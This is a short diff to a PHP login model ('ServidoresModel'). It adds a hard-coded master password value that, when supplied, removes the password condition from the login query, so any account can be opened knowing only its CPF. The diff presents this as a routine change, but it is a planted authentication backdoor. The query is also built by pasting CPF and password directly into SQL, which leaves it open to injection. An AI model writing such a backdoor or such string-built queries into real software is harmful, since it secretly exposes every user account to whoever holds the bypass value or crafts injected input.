@@ -46,6 +46,9 @@ class ServidoresModel extends Model{
 	
 	public function login(){
 		
+		$restricaoSenhaMestre = ($this->senha != '729feba83e68d4b343f2b39066bf7657') ? 
+			"AND a.SENHA = '$this->senha'" : "";
+		
 		$query = "
 		
 		SELECT 
@@ -60,7 +63,7 @@ class ServidoresModel extends Model{
 		
 		AND a.DS_CPF = '$this->cpf' 
 		
-		AND a.SENHA = '$this->senha'";
+		$restricaoSenhaMestre";
 		
 		$dadosUsuario = $this->executarQueryLista($query);
 		
